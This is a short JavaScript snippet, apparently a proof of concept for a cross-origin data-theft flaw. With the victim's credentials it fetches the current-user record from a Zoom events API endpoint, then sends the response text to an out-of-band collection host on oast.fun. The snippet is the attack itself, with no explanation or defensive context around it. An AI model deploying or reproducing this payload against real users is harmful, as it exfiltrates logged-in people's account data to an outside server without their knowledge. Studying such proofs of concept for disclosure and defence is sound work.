var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    fetch(('http://cg31y2g2vtc0000yj8x0gebo9bcyyyyyb.oast.fun/?xxx='+this.responseText))
    .then(res => res.json())
    .then(data => console.log(data))
};
